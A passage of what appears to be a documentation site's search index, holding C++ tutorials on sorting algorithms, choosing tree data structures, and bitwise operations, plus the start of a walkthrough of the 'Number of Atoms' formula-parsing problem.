&lt;vector&gt;\n#include &lt;string&gt;\n\nstruct Person {\n    std::string name;\n    int age;\n};\n\nbool compareByName(const Person&amp; a, const Person&amp; b) {\n    return a.name &lt; b.name;\n}\n\nint main() {\n    std::vector&lt;Person&gt; people = {{\"Alice\", 30}, {\"Bob\", 25}, {\"Charlie\", 30}};\n    std::sort(people.begin(), people.end(), compareByName);\n    return 0;\n}\n</code></pre></p>"},{"location":"programming/Sorting%20Idealogy/#finally","title":"Finally","text":"<p>Choosing the right sorting algorithm in C++ depends on the specific requirements of your task, such as stability, efficiency, and whether you need to sort the entire range or just part of it. By understanding the strengths and ideal use cases of <code>std::sort</code>, <code>std::stable_sort</code>, <code>std::partial_sort</code>, and <code>std::nth_element</code>, you can make informed decisions to optimize the performance and functionality of your C++ programs.</p>"},{"location":"programming/Tree%20Use%20Idealogy/","title":"Tree Use Idealogy","text":""},{"location":"programming/Tree%20Use%20Idealogy/#choosing-the-right-tree-data-structure-in-c","title":"Choosing the Right Tree Data Structure in C++","text":"<p>When developing applications in C++, selecting the appropriate tree data structure is critical for optimal performance and efficient memory usage. Different types of trees are suited for various scenarios depending on the specific requirements of the application. This blog will cover common tree structures, their characteristics, and the scenarios in which each is most effective, along with examples.</p>"},{"location":"programming/Tree%20Use%20Idealogy/#1-binary-search-tree-bst","title":"1. Binary Search Tree (BST)","text":"<p>Characteristics: - Each node has at most two children, referred to as the left child and the right child. - The left subtree of a node contains only nodes with keys less than the node\u2019s key. - The right subtree of a node contains only nodes with keys greater than the node\u2019s key. - No duplicate nodes.</p> <p>When to Use: - When you need a simple data structure for dynamic set operations, such as insertions, deletions, and lookups. - When the dataset is relatively small or expected to be balanced, providing O(log n) time complexity for search, insert, and delete operations.</p> <p>Example Use Case: - Implementing a simple in-memory database where fast lookups and updates are required.</p> <p>Example: <pre><code>#include &lt;iostream&gt;\nusing namespace std;\n\nstruct Node {\n    int key;\n    Node *left, *right;\n    Node(int val) : key(val), left(nullptr), right(nullptr) {}\n};\n\nclass BST {\npublic:\n    Node* insert(Node* root, int key) {\n        if (!root) return new Node(key);\n        if (key &lt; root-&gt;key) root-&gt;left = insert(root-&gt;left, key);\n        else root-&gt;right = insert(root-&gt;right, key);\n        return root;\n    }\n\n    void inorder(Node* root) {\n        if (root) {\n            inorder(root-&gt;left);\n            cout &lt;&lt; root-&gt;key &lt;&lt; \" \";\n            inorder(root-&gt;right);\n        }\n    }\n};\n\nint main() {\n    BST tree;\n    Node* root = nullptr;\n    root = tree.insert(root, 50);\n    tree.insert(root, 30);\n    tree.insert(root, 70);\n    tree.insert(root, 20);\n    tree.insert(root, 40);\n    tree.insert(root, 60);\n    tree.insert(root, 80);\n\n    tree.inorder(root);\n    return 0;\n}\n</code></pre></p>"},{"location":"programming/Tree%20Use%20Idealogy/#2-balanced-binary-search-trees-avl-and-red-black-trees","title":"2. Balanced Binary Search Trees (AVL and Red-Black Trees)","text":"<p>Characteristics: - AVL Tree: Each node maintains a balance factor based on the heights of its children, ensuring the tree remains balanced. - Red-Black Tree: A self-balancing BST with additional properties to maintain balance through color coding of nodes and specific rules.</p> <p>When to Use: - When you need guaranteed O(log n) time complexity for search, insert, and delete operations. - When performance consistency is crucial and the dataset might cause an unbalanced BST.</p> <p>Example Use Case: - Implementing the associative containers (e.g., <code>std::map</code>, <code>std::set</code> in C++) which require efficient search, insertion, and deletion.</p> <p>Example (Red-Black Tree using <code>std::map</code>): <pre><code>#include &lt;iostream&gt;\n#include &lt;map&gt;\nusing namespace std;\n\nint main() {\n    map&lt;int, string&gt; rbTree;\n    rbTree[1] = \"one\";\n    rbTree[2] = \"two\";\n    rbTree[3] = \"three\";\n\n    for (const auto&amp; [key, value] : rbTree) {\n        cout &lt;&lt; key &lt;&lt; \": \" &lt;&lt; value &lt;&lt; endl;\n    }\n\n    return 0;\n}\n</code></pre></p>"},{"location":"programming/Tree%20Use%20Idealogy/#3-b-trees-and-b-trees","title":"3. B-Trees and B+ Trees","text":"<p>Characteristics: - B-Tree: A self-balancing tree data structure that maintains sorted data and allows searches, sequential access, insertions, and deletions in logarithmic time. - B+ Tree: A type of B-Tree where all values are at the leaf level and internal nodes only store keys.</p> <p>When to Use: - When working with large datasets that cannot be entirely loaded into memory. - When frequent disk access is necessary, as B-Trees minimize disk I/O operations.</p> <p>Example Use Case: - Database indexing where large amounts of data are stored on disk.</p> <p>Example: Due to the complexity of B-Tree implementation, it is typically abstracted in database management systems or libraries rather than implemented directly in application code.</p>"},{"location":"programming/Tree%20Use%20Idealogy/#4-trie-prefix-tree","title":"4. Trie (Prefix Tree)","text":"<p>Characteristics: - A tree-like data structure that stores a dynamic set of strings, where keys are usually strings. - Each node represents a single character of a string.</p> <p>When to Use: - When you need efficient retrieval of a key from a dataset of strings. - Ideal for autocomplete features, spell checkers, and IP routing.</p> <p>Example Use Case: - Implementing a dictionary where fast prefix-based searches are required.</p> <p>Example: <pre><code>#include &lt;iostream&gt;\n#include &lt;unordered_map&gt;\nusing namespace std;\n\nstruct TrieNode {\n    unordered_map&lt;char, TrieNode*&gt; children;\n    bool isEndOfWord;\n    TrieNode() : isEndOfWord(false) {}\n};\n\nclass Trie {\npublic:\n    Trie() {\n        root = new TrieNode();\n    }\n\n    void insert(string word) {\n        TrieNode* node = root;\n        for (char c : word) {\n            if (!node-&gt;children[c]) {\n                node-&gt;children[c] = new TrieNode();\n            }\n            node = node-&gt;children[c];\n        }\n        node-&gt;isEndOfWord = true;\n    }\n\n    bool search(string word) {\n        TrieNode* node = root;\n        for (char c : word) {\n            if (!node-&gt;children[c]) return false;\n            node = node-&gt;children[c];\n        }\n        return node-&gt;isEndOfWord;\n    }\n\nprivate:\n    TrieNode* root;\n};\n\nint main() {\n    Trie trie;\n    trie.insert(\"hello\");\n    trie.insert(\"world\");\n\n    cout &lt;&lt; trie.search(\"hello\") &lt;&lt; endl;  // Output: 1 (true)\n    cout &lt;&lt; trie.search(\"world\") &lt;&lt; endl;  // Output: 1 (true)\n    cout &lt;&lt; trie.search(\"helloo\") &lt;&lt; endl; // Output: 0 (false)\n\n    return 0;\n}\n</code></pre></p>"},{"location":"programming/Tree%20Use%20Idealogy/#5-segment-tree","title":"5. Segment Tree","text":"<p>Characteristics: - A tree used for storing intervals or segments. - Allows querying which of the stored segments contain a given point.</p> <p>When to Use: - When you need to perform range queries and updates efficiently.</p> <p>Example Use Case: - Implementing a solution for the range minimum query or the range sum query problem.</p> <p>Example: <pre><code>#include &lt;iostream&gt;\n#include &lt;vector&gt;\nusing namespace std;\n\nclass SegmentTree {\n    vector&lt;int&gt; tree;\n    int n;\n\n    void build(const vector&lt;int&gt;&amp; arr, int node, int start, int end) {\n        if (start == end) {\n            tree[node] = arr[start];\n        } else {\n            int mid = (start + end) / 2;\n            build(arr, 2*node, start, mid);\n            build(arr, 2*node+1, mid+1, end);\n            tree[node] = tree[2*node] + tree[2*node+1];\n        }\n    }\n\n    void update(int node, int start, int end, int idx, int val) {\n        if (start == end) {\n            tree[node] = val;\n        } else {\n            int mid = (start + end) / 2;\n            if (start &lt;= idx &amp;&amp; idx &lt;= mid) {\n                update(2*node, start, mid, idx, val);\n            } else {\n                update(2*node+1, mid+1, end, idx, val);\n            }\n            tree[node] = tree[2*node] + tree[2*node+1];\n        }\n    }\n\n    int query(int node, int start, int end, int L, int R) {\n        if (R &lt; start || end &lt; L) {\n            return 0;\n        }\n        if (L &lt;= start &amp;&amp; end &lt;= R) {\n            return tree[node];\n        }\n        int mid = (start + end) / 2;\n        int p1 = query(2*node, start, mid, L, R);\n        int p2 = query(2*node+1, mid+1, end, L, R);\n        return p1 + p2;\n    }\n\npublic:\n    SegmentTree(const vector&lt;int&gt;&amp; arr) {\n        n = arr.size();\n        tree.resize(4*n);\n        build(arr, 1, 0, n-1);\n    }\n\n    void update(int idx, int val) {\n        update(1, 0, n-1, idx, val);\n    }\n\n    int query(int L, int R) {\n        return query(1, 0, n-1, L, R);\n    }\n};\n\nint main() {\n    vector&lt;int&gt; arr = {1, 3, 5, 7, 9, 11};\n    SegmentTree segTree(arr);\n\n    cout &lt;&lt; segTree.query(1, 3) &lt;&lt; endl;  // Output: 15\n    segTree.update(1, 10);\n    cout &lt;&lt; segTree.query(1, 3) &lt;&lt; endl;  // Output: 22\n\n    return 0;\n}\n</code></pre></p>"},{"location":"programming/Tree%20Use%20Idealogy/#6-suffix-tree","title":"6. Suffix Tree","text":"<p>Characteristics: - A compressed trie containing all the suffixes of a given text. - Used for various string operations.</p> <p>When to Use: - When you need efficient pattern matching in strings, longest repeated substring, and other string-related problems.</p> <p>Example Use Case: - Bioinformatics for DNA sequence analysis, where fast substring searching is necessary.</p> <p>Example: Due to the complexity of suffix tree implementation, it</p> <p>is typically provided by specialized libraries or tools rather than implemented directly in application code.</p>"},{"location":"programming/Tree%20Use%20Idealogy/#conclusion","title":"Conclusion","text":"<p>Choosing the right tree data structure depends on the specific requirements of your application, such as the type of data being stored, the operations you need to perform, and the performance characteristics you need to achieve. Understanding the strengths and weaknesses of each tree type will help you make an informed decision that balances efficiency and simplicity.</p> <p>Each tree structure discussed above serves a unique purpose and is suited for different scenarios. By carefully considering the use cases and characteristics, you can select the most appropriate tree structure to meet your application's needs.</p>"},{"location":"programming/bitwise/","title":"Bitwise","text":"<p>Bit manipulation involves the direct manipulation of bits, which can be a very efficient way to perform operations on binary data. In C++, bit manipulation can be done using bitwise operators. Here\u2019s a detailed guide on bit manipulation with examples in C++.</p>"},{"location":"programming/bitwise/#bitwise-operators-in-c","title":"Bitwise Operators in C++","text":"<ol> <li>AND (<code>&amp;</code>)</li> <li>This operator performs a bitwise AND operation.</li> <li> <p>Example: <code>5 &amp; 3</code> results in <code>1</code> because in binary <code>5</code> is <code>0101</code> and <code>3</code> is <code>0011</code>.</p> </li> <li> <p>OR (<code>|</code>)</p> </li> <li>This operator performs a bitwise OR operation.</li> <li> <p>Example: <code>5 | 3</code> results in <code>7</code> because in binary <code>5</code> is <code>0101</code> and <code>3</code> is <code>0011</code>.</p> </li> <li> <p>XOR (<code>^</code>)</p> </li> <li>This operator performs a bitwise XOR operation.</li> <li> <p>Example: <code>5 ^ 3</code> results in <code>6</code> because in binary <code>5</code> is <code>0101</code> and <code>3</code> is <code>0011</code>.</p> </li> <li> <p>NOT (<code>~</code>)</p> </li> <li>This operator performs a bitwise NOT operation.</li> <li> <p>Example: <code>~5</code> results in <code>-6</code> because in binary <code>5</code> is <code>0101</code> and its bitwise NOT is <code>1010</code> which is <code>-6</code> in two's complement representation.</p> </li> <li> <p>Left Shift (<code>&lt;&lt;</code>)</p> </li> <li>This operator shifts the bits of the first operand left by the number of positions specified by the second operand.</li> <li> <p>Example: <code>5 &lt;&lt; 1</code> results in <code>10</code> because in binary <code>5</code> is <code>0101</code> and shifting left by 1 bit results in <code>1010</code>.</p> </li> <li> <p>Right Shift (<code>&gt;&gt;</code>)</p> </li> <li>This operator shifts the bits of the first operand right by the number of positions specified by the second operand.</li> <li>Example: <code>5 &gt;&gt; 1</code> results in <code>2</code> because in binary <code>5</code> is <code>0101</code> and shifting right by 1 bit results in <code>0010</code>.</li> </ol>"},{"location":"programming/bitwise/#practical-examples","title":"Practical Examples","text":""},{"location":"programming/bitwise/#example-1-checking-if-a-number-is-even-or-odd","title":"Example 1: Checking if a Number is Even or Odd","text":"<p><pre><code>#include &lt;iostream&gt;\n\nint main() {\n    int num = 5;\n    if (num &amp; 1) {\n        std::cout &lt;&lt; num &lt;&lt; \" is odd\" &lt;&lt; std::endl;\n    } else {\n        std::cout &lt;&lt; num &lt;&lt; \" is even\" &lt;&lt; std::endl;\n    }\n    return 0;\n}\n</code></pre> In this example, the least significant bit is checked to determine if the number is odd or even.</p>"},{"location":"programming/bitwise/#example-2-swapping-two-numbers-without-a-temporary-variable","title":"Example 2: Swapping Two Numbers Without a Temporary Variable","text":"<p><pre><code>#include &lt;iostream&gt;\n\nint main() {\n    int a = 5, b = 3;\n    a = a ^ b;\n    b = a ^ b;\n    a = a ^ b;\n    std::cout &lt;&lt; \"a: \" &lt;&lt; a &lt;&lt; \", b: \" &lt;&lt; b &lt;&lt; std::endl;\n    return 0;\n}\n</code></pre> This example uses the XOR operator to swap the values of <code>a</code> and <code>b</code> without using a temporary variable.</p>"},{"location":"programming/bitwise/#example-3-counting-set-bits-in-an-integer","title":"Example 3: Counting Set Bits in an Integer","text":"<p><pre><code>#include &lt;iostream&gt;\n\nint countSetBits(int num) {\n    int count = 0;\n    while (num) {\n        count += num &amp; 1;\n        num &gt;&gt;= 1;\n    }\n    return count;\n}\n\nint main() {\n    int num = 29; // Binary: 11101\n    std::cout &lt;&lt; \"Number of set bits: \" &lt;&lt; countSetBits(num) &lt;&lt; std::endl;\n    return 0;\n}\n</code></pre> This function counts the number of 1's (set bits) in the binary representation of an integer.</p>"},{"location":"programming/bitwise/#example-4-reversing-bits-of-an-integer","title":"Example 4: Reversing Bits of an Integer","text":"<p><pre><code>#include &lt;iostream&gt;\n\nunsigned int reverseBits(unsigned int num) {\n    unsigned int count = sizeof(num) * 8 - 1;\n    unsigned int reverse_num = num;\n\n    num &gt;&gt;= 1;\n    while (num) {\n        reverse_num &lt;&lt;= 1;\n        reverse_num |= num &amp; 1;\n        num &gt;&gt;= 1;\n        count--;\n    }\n    reverse_num &lt;&lt;= count; // Shift when num is zero\n\n    return reverse_num;\n}\n\nint main() {\n    unsigned int x = 1; // Binary: 00000000000000000000000000000001\n    std::cout &lt;&lt; reverseBits(x) &lt;&lt; std::endl; // Output: 2147483648 (Binary: 10000000000000000000000000000000)\n    return 0;\n}\n</code></pre> This function reverses the bits in an integer.</p>"},{"location":"programming/bitwise/#bit-manipulation-tricks","title":"Bit Manipulation Tricks","text":"<ol> <li> <p>Isolating the Rightmost 1-bit:    <pre><code>int x = 12; // Binary: 1100\nint rightmost_one = x &amp; -x; // Result: 4 (Binary: 0100)\n</code></pre></p> </li> <li> <p>Setting the Rightmost 0-bit to 1:    <pre><code>int x = 12; // Binary: 1100\nint set_rightmost_zero = x | (x + 1); // Result: 13 (Binary: 1101)\n</code></pre></p> </li> <li> <p>Clearing the Rightmost 1-bit:    <pre><code>int x = 12; // Binary: 1100\nint clear_rightmost_one = x &amp; (x - 1); // Result: 8 (Binary: 1000)\n</code></pre></p> </li> <li> <p>Checking if a Number is a Power of 2:    <pre><code>bool isPowerOfTwo(int x) {\n    return x &amp;&amp; !(x &amp; (x - 1));\n}\n</code></pre></p> </li> </ol> <p>These examples and tricks cover the fundamental concepts of bit manipulation in C++. Mastering these operations can significantly enhance the efficiency and performance of your code in specific scenarios.</p>"},{"location":"programming/bitwise/#bitwise-operations-use-cases-properties-and-laws","title":"Bitwise Operations: Use Cases, Properties, and Laws","text":""},{"location":"programming/bitwise/#multiplication-and-division-using-bitwise-operations","title":"Multiplication and Division using Bitwise Operations","text":"<p>Multiplication by Powers of Two: Bitwise left shift (<code>&lt;&lt;</code>) can be used to multiply a number by powers of two efficiently.</p> <p>Example: <pre><code>#include &lt;iostream&gt;\n\nint main() {\n    int num = 5;\n    int result = num &lt;&lt; 1; // Equivalent to 5 * 2^1 = 10\n    std::cout &lt;&lt; \"5 &lt;&lt; 1 = \" &lt;&lt; result &lt;&lt; std::endl;\n\n    result = num &lt;&lt; 2; // Equivalent to 5 * 2^2 = 20\n    std::cout &lt;&lt; \"5 &lt;&lt; 2 = \" &lt;&lt; result &lt;&lt; std::endl;\n\n    return 0;\n}\n</code></pre></p> <p>Division by Powers of Two: Bitwise right shift (<code>&gt;&gt;</code>) can be used to divide a number by powers of two efficiently.</p> <p>Example: <pre><code>#include &lt;iostream&gt;\n\nint main() {\n    int num = 20;\n    int result = num &gt;&gt; 1; // Equivalent to 20 / 2^1 = 10\n    std::cout &lt;&lt; \"20 &gt;&gt; 1 = \" &lt;&lt; result &lt;&lt; std::endl;\n\n    result = num &gt;&gt; 2; // Equivalent to 20 / 2^2 = 5\n    std::cout &lt;&lt; \"20 &gt;&gt; 2 = \" &lt;&lt; result &lt;&lt; std::endl;\n\n    return 0;\n}\n</code></pre></p>"},{"location":"programming/bitwise/#commutative-and-associative-laws","title":"Commutative and Associative Laws","text":"<ul> <li>Commutative Law:</li> <li><code>A &amp; B = B &amp; A</code></li> <li><code>A | B = B | A</code></li> <li> <p><code>A ^ B = B ^ A</code></p> </li> <li> <p>Associative Law:</p> </li> <li><code>(A &amp; B) &amp; C = A &amp; (B &amp; C)</code></li> <li><code>(A | B) | C = A | (B | C)</code></li> <li><code>(A ^ B) ^ C = A ^ (B ^ C)</code></li> </ul>"},{"location":"programming/bitwise/#distributive-law","title":"Distributive Law","text":"<ul> <li><code>A &amp; (B | C) = (A &amp; B) | (A &amp; C)</code></li> <li><code>A | (B &amp; C) = (A | B) &amp; (A | C)</code></li> </ul>"},{"location":"programming/bitwise/#identity-law","title":"Identity Law","text":"<ul> <li><code>A &amp; 0 = 0</code></li> <li><code>A | 0 = A</code></li> <li><code>A ^ 0 = A</code></li> </ul>"},{"location":"programming/bitwise/#null-law","title":"Null Law","text":"<ul> <li><code>A &amp; A = A</code></li> <li><code>A | A = A</code></li> <li><code>A ^ A = 0</code></li> </ul>"},{"location":"programming/bitwise/#idempotent-law","title":"Idempotent Law","text":"<ul> <li><code>A &amp; A = A</code></li> <li><code>A | A = A</code></li> </ul>"},{"location":"programming/bitwise/#inverse-law","title":"Inverse Law","text":"<ul> <li><code>A &amp; ~A = 0</code></li> <li><code>A | ~A = ~0</code> (All bits set to 1)</li> </ul>"},{"location":"programming/bitwise/#complement-and-inverse","title":"Complement and Inverse","text":"<p>Complement: The bitwise complement operator (<code>~</code>) inverts all the bits of its operand.</p> <p>Example: <pre><code>#include &lt;iostream&gt;\n\nint main() {\n    int num = 5; // Binary: 0000 0101\n    int result = ~num; // Binary: 1111 1010\n    std::cout &lt;&lt; \"~5 = \" &lt;&lt; result &lt;&lt; std::endl; // Output will be -6 in two's complement representation\n    return 0;\n}\n</code></pre></p> <p>Inverse: The concept of inverse in bitwise operations is often represented by the XOR operation with the number itself, resulting in zero.</p> <p>Example: <pre><code>#include &lt;iostream&gt;\n\nint main() {\n    int num = 5; // Binary: 0000 0101\n    int result = num ^ num; // Binary: 0000 0000\n    std::cout &lt;&lt; \"5 ^ 5 = \" &lt;&lt; result &lt;&lt; std::endl; // Output will be 0\n    return 0;\n}\n</code></pre></p>"},{"location":"programming/bitwise/#use-cases-of-bitwise-operations","title":"Use Cases of Bitwise Operations","text":"<ol> <li> <p>Setting a Bit:    To set a specific bit, use the OR operator (<code>|</code>).    <pre><code>int num = 5; // Binary: 0101\nint bit_position = 1;\nnum |= (1 &lt;&lt; bit_position); // Set bit at position 1: Result is 7 (Binary: 0111)\n</code></pre></p> </li> <li> <p>Clearing a Bit:    To clear a specific bit, use the AND operator (<code>&amp;</code>) with the NOT operator (<code>~</code>).    <pre><code>int num = 5; // Binary: 0101\nint bit_position = 0;\nnum &amp;= ~(1 &lt;&lt; bit_position); // Clear bit at position 0: Result is 4 (Binary: 0100)\n</code></pre></p> </li> <li> <p>Toggling a Bit:    To toggle a specific bit, use the XOR operator (<code>^</code>).    <pre><code>int num = 5; // Binary: 0101\nint bit_position = 2;\nnum ^= (1 &lt;&lt; bit_position); // Toggle bit at position 2: Result is 1 (Binary: 0001)\n</code></pre></p> </li> <li> <p>Checking a Bit:    To check if a specific bit is set, use the AND operator (<code>&amp;</code>).    <pre><code>int num = 5; // Binary: 0101\nint bit_position = 2;\nbool is_set = num &amp; (1 &lt;&lt; bit_position); // Check bit at position 2: Result is true (1)\n</code></pre></p> </li> <li> <p>Extracting the Rightmost Set Bit:    To isolate the rightmost set bit.    <pre><code>int num = 12; // Binary: 1100\nint rightmost_set_bit = num &amp; -num; // Result is 4 (Binary: 0100)\n</code></pre></p> </li> <li> <p>Clearing the Rightmost Set Bit:    To clear the rightmost set bit.    <pre><code>int num = 12; // Binary: 1100\nnum = num &amp; (num - 1); // Result is 8 (Binary: 1000)\n</code></pre></p> </li> </ol>"},{"location":"programming/bitwise/#special-cases","title":"Special Cases","text":"<ol> <li>Multiplying and Dividing by Powers of Two:</li> <li>Multiplication by (2^n) is equivalent to left shifting by (n).</li> <li>Division by (2^n) is equivalent to right shifting by (n).</li> <li> <p>These operations are very efficient because shifting bits is faster than multiplication and division.</p> </li> <li> <p>Detecting Overflow:</p> </li> <li>When performing bitwise shifts, care must be taken to avoid overflow.</li> <li> <p>Example: Left shifting a bit pattern that extends beyond the size of the type can lead to unexpected results.</p> </li> <li> <p>Bitwise NOT and Two's Complement:</p> </li> <li>The bitwise NOT operation inverts all bits and is related to the two's complement representation used for negative numbers.</li> <li> <p>Example: The bitwise NOT of an integer (x) is (-x-1).</p> </li> <li> <p>Bitwise AND with Zero:</p> </li> <li>Any number ANDed with zero results in zero.</li> <li> <p>Example: ( x &amp; 0 = 0 ).</p> </li> <li> <p>Bitwise OR with Zero:</p> </li> <li>Any number ORed with zero remains unchanged.</li> <li> <p>Example: ( x | 0 = x ).</p> </li> <li> <p>Bitwise XOR with Self:</p> </li> <li>Any number XORed with itself results in zero.</li> <li> <p>Example: ( x ^ x = 0 ).</p> </li> <li> <p>Bitwise XOR with Zero:</p> </li> <li>Any number XORed with zero remains unchanged.</li> <li>Example: ( x ^ 0 = x ).</li> </ol>"},{"location":"programming/bitwise/#examples","title":"Examples","text":"<p>Example 1: Isolating the Rightmost Set Bit</p> <p>To isolate the rightmost set bit (the rightmost 1-bit): <pre><code>#include &lt;iostream&gt;\n\nint main() {\n    int num = 12; // Binary: 1100\n    int rightmost_set_bit = num &amp; -num; // Result is 4 (Binary: 0100)\n    std::cout &lt;&lt; \"Rightmost set bit: \" &lt;&lt; rightmost_set_bit &lt;&lt; std::endl;\n    return 0;\n}\n</code></pre> Explanation: - The expression <code>num &amp; -num</code> isolates the rightmost set bit. <code>-num</code> is the two's complement of <code>num</code>.</p> <p>Example 2: Clearing the Rightmost Set Bit</p> <p>To clear the rightmost set bit: <pre><code>#include &lt;iostream&gt;\n\nint main() {\n    int num = 12; // Binary: 1100\n    num = num &amp; (num - 1); // Result is 8 (Binary: 1000)\n    std::cout &lt;&lt; \"After clearing rightmost set bit: \" &lt;&lt; num &lt;&lt; std::endl;\n    return 0;\n}\n</code></pre> Explanation: - The expression <code>num &amp; (num - 1)</code> clears the rightmost set bit.</p> <p>Example 3: Checking if a Number is a Power of Two</p> <p>To check if a number is a power of two: <pre><code>#include &lt;iostream&gt;\n\nbool isPowerOfTwo(int num) {\n    return num &gt; 0 &amp;&amp; (num &amp; (num - 1)) == 0;\n}\n\nint main() {\n    int num = 16;\n    if (isPowerOfTwo(num)) {\n        std::cout &lt;&lt; num &lt;&lt; \" is a power of two.\" &lt;&lt; std::endl;\n    } else {\n        std::cout &lt;&lt; num &lt;&lt; \" is not a power of two.\" &lt;&lt; std::endl;\n    }\n    return 0;\n}\n</code></pre> Explanation: - A number is a power of two if it has exactly one set bit. The expression <code>(num &amp; (num - 1)) == 0</code> checks this condition.</p> <p>Example 4: Counting the Number of Set Bits</p> <p>To count the number of set bits in an integer: <pre><code>#include &lt;iostream&gt;\n\nint countSetBits(int num) {\n    int count = 0;\n    while (num) {\n        count += num &amp; 1;\n        num &gt;&gt;= 1;\n    }\n    return count;\n}\n\nint main() {\n    int num = 29; // Binary: 11101\n    std::cout &lt;&lt; \"Number of set bits: \" &lt;&lt; countSetBits(num) &lt;&lt; std::endl;\n    return 0;\n}\n</code></pre> Explanation: - The function iterates through all bits of <code>num</code>, incrementing the count whenever the least significant bit is set.</p> <p>Example 5: Swapping Two Numbers Using XOR</p> <p>To swap two numbers without using a temporary variable: <pre><code>#include &lt;iostream&gt;\n\nint main() {\n    int a = 5, b = 3;\n    a = a ^ b;\n    b = a ^ b;\n    a = a ^ b;\n    std::cout &lt;&lt; \"After swapping: a = \" &lt;&lt; a &lt;&lt; \", b = \" &lt;&lt; b &lt;&lt; std::endl;\n    return 0;\n}\n</code></pre> Explanation: - XOR operations are used to swap the values of <code>a</code> and <code>b</code> without a temporary variable.</p> <p>Example 6: Finding the Most Significant Set Bit</p> <p>To find the position of the most significant set bit: <pre><code>#include &lt;iostream&gt;\n\nint findMSB(int num) {\n    int msb = -1;\n    while (num) {\n        num &gt;&gt;= 1;\n        msb++;\n    }\n    return msb;\n}\n\nint main() {\n    int num = 18; // Binary: 10010\n    std::cout &lt;&lt; \"Most significant set bit position: \" &lt;&lt; findMSB(num) &lt;&lt; std::endl;\n    return 0;\n}\n</code></pre> Explanation: - The function shifts the number right until it becomes zero, counting the number of shifts to determine the position of the most significant set bit.</p>"},{"location":"programming/bitwise/#conclusion","title":"Conclusion","text":"<p>Bitwise operations provide a powerful and efficient way to manipulate individual bits within an integer. They have special cases and properties that make them useful for various applications, including setting, clearing, and toggling bits, checking conditions, and performing arithmetic operations. Understanding these operations and their use cases can lead to more optimized and elegant solutions in programming.</p>"},{"location":"programming/numofatoms/","title":"Number Of Atoms","text":"<p>Given a string formula representing a chemical formula, return the count of each atom.</p> <p>The atomic element always starts with an uppercase character, then zero or more lowercase letters, representing the name.</p> <p>One or more digits representing that element's count may follow if the count is greater than 1. If the count is 1, no digits will follow.</p> <p>For example, \"H2O\" and \"H2O2\" are possible, but \"H1O2\" is impossible. Two formulas are concatenated together to produce another formula.</p> <p>For example, \"H2O2He3Mg4\" is also a formula. A formula placed in parentheses, and a count (optionally added) is also a formula.</p> <p>For example, \"(H2O2)\" and \"(H2O2)3\" are formulas. Return the count of all elements as a string in the following form: the first name (in sorted order), followed by its count (if that count is more than 1), followed by the second name (in sorted order), followed by its count (if that count is more than 1), and so on.</p> <p>The test cases are generated so that all the values in the output fit in a 32-bit integer.</p> <p>Overview</p> <p>In this problem, we are given a string formula, which represents a valid chemical formula. The formula follows certain rules, as mentioned in the problem description. We are supposed to return the count of each atom in the formula.</p> <p>An atom contains a UPPERCASE letter followed by zero or more lowercase letters.</p> <p>Since the problem revolves around formula, let's dissect the formula and understand what it contains.</p> <p>A formula can contain the following</p> <p>UPPERCASE LETTER: A, B ... Z. Let's denote the group as U.</p> <p>lowercase letter: a, b ... z. Let's denote the group as L.</p> <p>Digits: 0, 1 ... 9. Let's denote the group as D.</p> <p>Left Parenthesis: (</p> <p>Right Parenthesis: )</p> <p>Can we have L followed by D? Yes, the formula can contain a lowercase letter followed by a digit.</p> <p>Can we have D followed by L? No, the formula cannot contain a digit followed by a lowercase letter. An atom begins with a UPPERCASE letter.</p> <p>Hence, only certain groups can be followed by certain groups. Let's summarise it in a table. The (row, column) of this table comments on whether the group in the row can be followed by the group in the column, and further explains the significance of the combination.</p> <p>U   L   D   (   ) U   Yes. It will signify that the current atom has a one-character representation with an immediate count as 1  Yes. It will signify that the current atom has a multi-character representation Yes. It will signify that the current atom has a one-character representation with a count greater than 1   Yes. It will signify that the current atom has a one-character representation with an immediate count as 1  Yes. It will signify that the current atom has a one-character representation with an immediate count as 1 L   Yes. It signifies that the atom of which this lowercase letter is a part has a multi-character representation with an immediate count as 1  Yes. It signifies that the atom of which this lowercase letter is a part has a multi-character representation   Yes. It signifies that the atom of which this lowercase letter is a part has a multi-character representation with a count greater than 1   Yes. It signifies that the atom of which this lowercase letter is a part has a multi-character representation with an immediate count as 1  Yes. It signifies that the atom of which this lowercase letter is a part has multi-character representation with immediate count as 1 D   Yes. The immediate count of the current atom is greater than 1  No. A digit cannot be followed by a lowercase letter    Yes. The immediate count of the current atom is greater than or equal to 10 Yes. The immediate count of the current atom is greater than 1  Yes. The immediate count of the current atom is greater than 1 (   Yes. It signifies the beginning of a grouped formula    No. An atom begins with a UPPERCASE LETTER  No. Count cannot be allotted to a left parenthesis  Yes. It signifies the beginning of a grouped formula    No. A left parenthesis cannot be immediately followed by a right parenthesis )   Yes. It signifies the end of a grouped formula  No. An atom begins with a UPPERCASE LETTER  Yes. It signifies the end of a grouped formula followed by the count    Yes. It signifies the end of a grouped formula, and the beginning of a new formula  Yes. It signifies the end of two nested grouped formulas The analysis might look a bit overwhelming, but it is important to understand the structure of a valid formula.</p> <p>We can define the following skeleton to solve the problem.</p> <p>To find the count of each atom in the formula, we need to scan the string formula, and extract the atoms which may be followed by certain digits representing count. We need to extract those digits and save them as the count of the atom. If no digits are there, we will take the count as 1.</p> <p>The parenthesis signifies the beginning of the nested formula, which we can analyze (and add) as mentioned in the above paragraph. The count of the nested formula will be multiplied by the count of atoms in the nested formula.</p> <p>Before moving further, let's emphasize the fact that for every character that we are going to scan, we need to check if it is in U, L, D, or equal to either of ( or ).</p> <p>For this, we can define helper functions that will be helpful in the implementation. Click here to learn more about the helper functions.</p> <p>With all tools in our hands, let's understand various ways to solve the problem.</p> <p>Approach 1: Recursion</p> <p>Intuition</p> <p>Let's again focus on the skeleton that we defined in the Overview section.</p> <p>To find the count of each atom in the formula, we need to scan the string formula, and extract the atoms which may be followed by certain digits representing count. We need to extract those digits and save them as the count of the atom. If no digits are there, we will take the count as 1.</p> <p>The parenthesis signifies the beginning of the nested formula, which we can analyze (and add) as mentioned in the above paragraph. The count of the nested formula will be multiplied by the count of atoms in the nested formula.</p> <p>In the second paragraph, we are calling the methodology defined in the first paragraph. In other words, the skeleton uses the skeleton itself. Is there a programming paradigm that uses the same concept? Yes, it is called recursion.</p> <p>Recursion is a programming paradigm where a function calls itself. The function solves a smaller instance of the same problem and then combines the result to solve the original problem. To avoid infinite recursion, there is a base case that stops the recursion.</p> <p>To deeply understand recursion, it is advised to visit Recursion-I and Recursion-II Explore Cards.</p> <p>Hence, we only need to narrow our attention to solve the non-nested formula. The nested formula will be solved using the same methodology.</p> <p>Now, for parsing a non-nested formula (or recursively nested formula), we need information of the starting index of the formula. What can be the character at the starting index?</p> 